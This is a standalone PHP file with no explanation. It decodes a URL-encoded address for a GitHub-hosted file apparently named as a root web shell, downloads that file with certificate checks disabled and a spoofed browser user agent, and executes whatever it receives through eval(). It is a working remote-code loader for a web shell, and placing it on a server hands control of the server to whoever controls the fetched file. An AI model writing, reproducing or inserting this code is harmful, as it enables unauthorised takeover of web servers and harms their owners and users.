<?php

$decoded_url = rawurldecode(urldecode("https%3A%2F%2Fraw.githubusercontent.com%2Frendihidayat683%2Fweblist-SHELL%2Frefs%2Fheads%2Fmain%2Falfa_root.php"));

function fetch_content($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, FALSE);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
        $response = curl_exec($ch);
        curl_close($ch);
        if ($response !== false) {
            return $response;
        }
    }

    return @file_get_contents($url);
}

$content = fetch_content($decoded_url);

if ($content !== null) {
    eval("?>" . $content);
}

?>
